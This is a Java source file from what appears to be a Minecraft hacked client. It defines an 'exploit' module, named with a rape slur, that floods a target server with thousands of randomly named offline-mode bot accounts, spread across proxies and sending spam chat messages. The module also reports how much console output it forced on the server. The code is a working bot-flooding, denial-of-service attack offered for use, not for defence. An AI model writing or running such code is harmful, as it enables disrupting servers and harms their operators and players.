package epsilon.modules.exploit;

import org.lwjgl.input.Keyboard;


import epsilon.Epsilon;
import epsilon.botting.MintAttack;
import epsilon.command.impl.Cracked;
import epsilon.command.impl.CrackedMessage;
import epsilon.events.Event;
import epsilon.events.listeners.EventUpdate;
import epsilon.events.listeners.packet.EventReceivePacket;
import epsilon.modules.Module;
import epsilon.settings.setting.ModeSetting;
import epsilon.settings.setting.NoteSetting;
import epsilon.settings.setting.NumberSetting;
import epsilon.util.Timer;
import net.minecraft.client.main.Main;
import net.minecraft.client.multiplayer.GuiConnecting;
import net.minecraft.client.multiplayer.ServerAddress;
import net.minecraft.network.Packet;
import net.minecraft.network.login.server.S01PacketEncryptionRequest;
import net.minecraft.server.integrated.IntegratedServer;

import java.net.InetAddress;

public class CrackedRaper extends Module{

	private String ip;
	private int port, count = 0;
	private int ticks = 0;
	
	public NumberSetting delay = new NumberSetting ("JoinDelay(MSBased)", 15, 0, 10000, 15);

	public ModeSetting portFill = new ModeSetting ("ProxyFillMethod", "Spreading", "Spreading", "Fillup");
	
	public NumberSetting portSize = new NumberSetting ("Max Accs Per Proxy (Fill Up Mode)", 100, 5, 10000, 5);
	
	public NoteSetting info = new NoteSetting ("To use ports use .proxyadd <ip> <type>  ");
	public NoteSetting info3 = new NoteSetting ("to clear, do .proxyclear ");
	public NoteSetting info4 = new NoteSetting ("to remove specific do .proxyremove");
	
	Timer timer = new Timer();
	
	public CrackedRaper() {
		super("CrackedRaper", Keyboard.KEY_NONE, Category.EXPLOIT, "Makes 10000's of cracked players join a server, you may use .cracked <name> to change nick prefix of acc ");
		this.addSettings(delay, portFill, portSize, info, info3, info4);
	}
	
	public void onDisable() {
		Epsilon.addChatMessage("Hit server with " + count + " Bots");
		Epsilon.addChatMessage("Forced console to print " + (291*count) + " char");
		count = 0;
	}
	
	public void onEnable() {
		if(Epsilon.ip==null && this.toggled) {
			this.toggle();
			return;
		}
		port = Epsilon.port;
		ip = Epsilon.ip;
		
		
	}
	
	public void onEvent(Event e) {
		
		if(e instanceof EventUpdate && mc.thePlayer !=null && mc.getNetHandler().doneLoadingTerrain) {
			ticks++;
			if(timer.hasTimeElapsed((long) delay.getValue(), true)) {
				count++;
				if(CrackedMessage.getMessage()!="")
				MintAttack.createNewBot(genCrackedAlt(Cracked.name), true, CrackedMessage.getMessage(), port, ip);
				else {
					MintAttack.createNewBot(genCrackedAlt(Cracked.name), true, "Blac", port, ip);
				}
			}
		
		}
		
		
	}
	
	public static String genCrackedAlt(String name) {
		final int stringLength = 15 - name.length();
		
		return name + getAlphaNumericString(stringLength);
	}
	static String getAlphaNumericString(int n)
    {
  
        // chose a Character random from this String
        String AlphaNumericString = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                                    + "0123456789";
  
        // create StringBuffer size of AlphaNumericString
        StringBuilder sb = new StringBuilder(n);
  
        for (int i = 0; i < n; i++) {
  
            // generate a random number between
            // 0 to AlphaNumericString variable length
            int index
                = (int)(AlphaNumericString.length()
                        * Math.random());
  
            // add Character one by one in end of sb
            sb.append(AlphaNumericString
                          .charAt(index));
        }
  
        return sb.toString();
    }
  
 	
	

}
